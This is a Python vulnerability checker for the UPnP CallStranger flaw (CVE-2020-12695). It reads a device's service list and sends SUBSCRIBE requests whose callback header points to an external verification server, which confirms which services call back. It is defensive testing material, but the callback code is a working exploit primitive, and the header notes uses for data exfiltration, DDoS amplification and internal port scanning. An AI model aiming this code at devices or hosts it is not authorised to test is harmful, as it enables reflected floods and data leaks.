import os
import sys, getopt
import requests
import socket
import cryptography
import time

from cryptography.fernet import Fernet
from sys import platform
from urllib.parse import urlparse
from xml.dom import minidom
from termcolor import colored, cprint

from helpers import *

if sys.platform == "win32":
    os.system("color")

logo = (
    "_________        .__  .__    _________ __                                              \n"
    "\_   ___ \_____  |  | |  |  /   _____//  |_____________    ____    ____   ___________  \n"
    "/    \  \/\__  \ |  | |  |  \_____  \\   __\_  __ \__  \  /    \  / ___\_/ __ \_  __ \ \n"
    "\     \____/ __ \|  |_|  |__/        \|  |  |  | \// __ \|   |  \/ /_/  >  ___/|  | \/ \n"
    " \______  (____  /____/____/_______  /|__|  |__|  (____  /___|  /\___  / \___  >__|    \n"
    "        \/     \/                  \/                  \/     \//_____/      \/        "
)

header = (
    "This script created by Yunus Çadırcı (https://twitter.com/yunuscadirci, to check against CallStranger (CVE-2020-12695) vulnerability. An attacker can use this vulnerability for:"
    "* Bypassing DLP for exfiltrating data",
    "* Using millions of Internet-facing UPnP device as source of amplified reflected TCP DDoS / SYN Flood",
    "* Scanning internal ports from Internet facing UPnP devices",
    "You can find detailed information on https://www.callstranger.com  https://kb.cert.org/vuls/id/339275 https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2020-12695",
    "Slightly modified version of https://github.com/5kyc0d3r/upnpy used for base UPnP communication",
)

printgreen(logo)
print(header)

print("Usage: python3 CallDirect.py devicedocumenturl")
print("Example: python3 CallDirect.py http://192.168.1.1:37215/upnpdev.xml")


def subscribe(URL, callbackURL):
    myheaders = {
        "User-Agent": "Callstranger Vulnerability Checker",
        "CALLBACK": f"<{callbackURL}>",
        "NT": "upnp:event",
        "TIMEOUT": "Second-300",
        "Accept-Encoding": None,
        "Accept": None,
        "Connection": None,
    }
    # print(URL,callbackURL,'sending')
    req = requests.request("SUBSCRIBE", URL, headers=myheaders)
    if req.status_code == 200:
        printgreen(f"Subscribe to {URL} seems successful")
        print(req.headers)
        print(req.text)
    else:
        printred(f"Subscribe to {URL} failed with status code: {req.status_code}")
        print(req.headers)
        print(req.text)


directservices = {}


def getsession(path):
    session = ""
    try:
        getses = requests.request("PUT", path)
        session = getses.text
        printgreen(f"Successfully get session: {session}")
    except:
        printred(f"Could not contact server {path} for vulnerability confirmation")
    return session


def geturl(path):
    document = ""
    try:
        getses = requests.request("GET", path)
        document = getses.text
        printgreen(f"Successfully get session: {path}")
    except:
        printred(f"could not contact server{path}")
    return document


def get_services(path):
    root = minidom.parseString(geturl(path))
    o = urlparse(path)
    try:
        for service in root.getElementsByTagName("service"):
            event_sub_url = (
                "/"
                + service.getElementsByTagName("eventSubURL")[0].firstChild.nodeValue
            ).replace(
                "//", "/"
            )  # dirty hack for eventSubURL startr
            print(event_sub_url)
            services.append(o.scheme + "://" + o.netloc + event_sub_url)
    except Exception as e:
        print("!Error in service definition", path, root)
    return services


def confirmvulnerableservices(path, key):
    vulnerableservices = ""
    try:
        getservices = requests.request("PUT", path)
        vulnerableservices = getservices.text
        printgreen(f"Successfully get services from server: {path}")
        print()
        print("Encrypted vulnerable services:")
        print(vulnerableservices)
        print()
        print(f"Decrypting vulnerable services with key: {key}")
        fk = Fernet(key)
        i = 1
        decryptedvulnerableservices = []
        printred("\nVerified vulnerable services: ")
        for line in vulnerableservices.splitlines():
            payload = fk.decrypt(line.encode()).decode()
            printred(f"{i}:	{payload}")
            decryptedvulnerableservices.append(payload)
            i += 1

        unverifiedservices = Diff(services, decryptedvulnerableservices)

        printyellow("\nUnverified  services: ")
        i = 1
        for unverifiedservice in unverifiedservices:
            printyellow(f"{i}: {unverifiedservice}")
            i += 1
    except:
        printred(
            f"Could not get services from server {path} for vulnerability confirmation"
        )


def Diff(li1, li2):
    li_dif = [i for i in li1 | +li2 if i not in li1 or i not in li2]
    return li_dif


services = []

dummyservicekeywords = ["dummy", "notfound"]
# this host must be external so you can be sure that devices are vulnerable. Most of UPnP stacks don't allow hostname. use IP if possible
StrangerHost = "http://" + socket.gethostbyname("verify.callstranger.com")
StrangerPort = "80"
getSessionPath = "/CallStranger.php?c=getsession"
putServicePath = "/CallStranger.php?c=addservice&service="  # this HTTP request verb is NOTIFY , your web server must respond to NOTIFY
getVulnerableServicesPath = "/CallStranger.php?c=getservices"
print(f"Stranger Host: {StrangerHost}")
print(f"Stranger Port: {StrangerPort}")


get_services(sys.argv[1])
print()
print(f"Total {len(services)} service(s) found. do you want to continue to VERIFY if service(s) are vulnerable?",)
printred(
    "Be careful: This operation needs Internet access and may transfer data about devices over network. Data encrypted on local and we can not see which services are vulnerable but ISPs and other elements may be able to inspect HTTP headers created by UPnP device. Because most of UPnPstack do not allow SSL connection we can not use it. "
)
if input("Do you want to continue? y/N ") == "y":
    ss = getsession(f"{StrangerHost}:{StrangerPort}{getSessionPath}")
    key = Fernet.generate_key()
    f = Fernet(key)
    print(
        f"Symmetric random key for encryption: {key}. We do not send this value to server so we can not see which services are vulnerable. All confirmation process is done on client side",
    )
    for serv in services:
        payload = f.encrypt(serv.encode()).decode()
        path = f"{StrangerHost}:{StrangerPort}{putServicePath}{payload}&token={ss}"
        print(f"Calling stranger for {serv} with {path}")
        try:
            subscribe(serv, path)
        except:
            print(f"{serv} {path} failed")

    printyellow("\n	Waiting 5 second for asynchronous requests")
    time.sleep(5)
    # NOTE: using urllib.parse.urlunsplit is probably better here
    vulnerabilityconfirmationpath = (
        f"{StrangerHost}:{StrangerPort}{getVulnerableServicesPath}&token={ss}"
    )
    confirmvulnerableservices(vulnerabilityconfirmationpath, key)


print("\n	Visit https://www.CallStranger.com for updates")
